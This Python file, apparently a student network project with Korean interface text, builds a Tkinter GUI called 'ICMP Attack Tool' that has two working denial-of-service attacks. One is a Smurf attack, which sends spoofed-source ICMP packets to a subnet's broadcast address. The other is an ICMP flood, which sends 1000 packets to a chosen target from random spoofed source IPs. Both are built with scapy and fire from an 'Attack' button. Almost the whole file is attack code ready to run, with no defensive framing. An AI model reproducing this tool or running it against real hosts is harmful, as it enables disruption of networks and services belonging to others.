import sys
import tkinter
from tkinter import *
from tkinter import font
from PIL import ImageTk, Image
from scapy.all import *
from scapy.all import ICMP, IP
from tkinter import messagebox
from tkinter import ttk
import tkinter.ttk
import random


window=tkinter.Tk()
window.title("ICMP Attack Tool")
window.geometry("700x420+700+300")
window.resizable(False, False)

notebook=tkinter.ttk.Notebook(window, width=700, height=420)
notebook.pack()

#TAB1
tab1=tkinter.Frame(window)
notebook.add(tab1, text="Smurf Attack")

smurf_img = Image.open("python/Network_prokect/image01.png")
smurf_bg = ImageTk.PhotoImage(smurf_img)
smurf_font1 = tkinter.font.Font(family="맑은 고딕", size=20, weight="bold")
smurf_font2 = tkinter.font.Font(family="맑은 고딕", size=12, weight="bold")
smurf_font3 = tkinter.font.Font(family="맑은 고딕", size=10)

smurf_input1 = StringVar()
smurf_input2 = StringVar()
smurf_input3 = IntVar()

def smurf_attack():
    ### smurf attack logic ###
    for i in range(1000):
        src_ip = smurf_input1.get()
        dst_ip_list = src_ip.split(".")
        dst_ip = dst_ip_list[0] + "." + dst_ip_list[1] + "." + dst_ip_list[2] + "." + "255"
        ping = IP(src=smurf_input1.get(), dst=dst_ip, proto="icmp")/ICMP()/(smurf_input2.get()*smurf_input3.get())
        if i == 0:
            messagebox.showwarning("Warning", src_ip + "로 설정된 Target IP로 스머프 공격을 진행합니다.")
        send(ping)
    messagebox.showinfo("Info", "설정된 타겟인 " + src_ip + "로 총 1000번의 스머프 공격이 진행되었습니다.")

frame1 = tkinter.Frame(tab1)
frame1.pack(side="left")

frame2 = tkinter.Frame(tab1)
frame2.pack(side="top")

frame3 = tkinter.Frame(tab1)
frame3.pack()

frame4 = tkinter.Frame(tab1)
frame4.pack()

frame5 = tkinter.Frame(tab1)
frame5.pack()

frame6 = tkinter.Frame(tab1)
frame6.pack()

label1 = Label(frame1, image=smurf_bg).pack(padx=35)

label2 = Label(frame2, text = "Smurf Attack", font=smurf_font1).pack(side="top", pady=30)

label3 = Label(frame3, text = "Target IP", font=smurf_font3).pack()
input1 = Entry(frame3, textvariable=smurf_input1).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

label4 = Label(frame4, text = "Payload Data", font=smurf_font3).pack()
input2 = Entry(frame4, textvariable=smurf_input2).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

label5 = Label(frame5, text = "How much length to send?", font=smurf_font3).pack()
input3 = Entry(frame5, textvariable=smurf_input3).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

attackBtn = Button(frame6, text = "Attack", background="red", command=smurf_attack, font=smurf_font2).pack(side="right", ipady=1)

#TAB2
tab2=tkinter.Frame(window)
notebook.add(tab2, text="ICMP Flooding Attack")

icmp_img = Image.open("python/Network_prokect/image02.png")
icmp_bg = ImageTk.PhotoImage(icmp_img)
icmp_font1 = tkinter.font.Font(family="맑은 고딕", size=20, weight="bold")
icmp_font2 = tkinter.font.Font(family="맑은 고딕", size=12, weight="bold")
icmp_font3 = tkinter.font.Font(family="맑은 고딕", size=10)

icmp_input1 = StringVar()
icmp_input2 = StringVar()
icmp_input3 = IntVar()

def icmp_attack():
    ### ICMP Flooding attack logic ###
    for i in range(1000):
        first = str(random.randint(0,255))
        second = str(random.randint(0,255))
        third = str(random.randint(0,255))
        fourth = str(random.randint(0,255))
        dst_ip = icmp_input1.get()
        src_ip = first + "." + second + "." + third + "." + fourth
        ping = IP(src=src_ip, dst=dst_ip, proto="icmp")/ICMP()/(icmp_input2.get()*icmp_input3.get())
        if i == 0:
            messagebox.showwarning("Warning", dst_ip + "로 설정된 Target IP로 ICMP Flooding 공격을 진행합니다.")
        send(ping)
    messagebox.showinfo("Info", "설정된 타겟인 " + dst_ip + "로 총 1000번의 ICMP Flooding 공격이 진행되었습니다.")

frame1 = tkinter.Frame(tab2)
frame1.pack(side="left")

frame2 = tkinter.Frame(tab2)
frame2.pack(side="top")

frame3 = tkinter.Frame(tab2)
frame3.pack()

frame4 = tkinter.Frame(tab2)
frame4.pack()

frame5 = tkinter.Frame(tab2)
frame5.pack()

frame6 = tkinter.Frame(tab2)
frame6.pack()

label1 = Label(frame1, image=icmp_bg).pack(padx=35)

label2 = Label(frame2, text = "ICMP Flooding Attack", font=icmp_font1).pack(side="top", pady=30)

label3 = Label(frame3, text = "Target IP", font=icmp_font3).pack()
input1 = Entry(frame3, textvariable=icmp_input1).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

label4 = Label(frame4, text = "Payload Data", font=smurf_font3).pack()
input2 = Entry(frame4, textvariable=icmp_input2).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

label5 = Label(frame5, text = "How much length to send?", font=smurf_font3).pack()
input3 = Entry(frame5, textvariable=icmp_input3).pack(side="left", padx=5, pady=10 ,ipadx=10, ipady=8)

attackBtn = Button(frame6, text = "Attack", background="red", command=icmp_attack, font=icmp_font2).pack(side="right", ipady=1)


window.mainloop()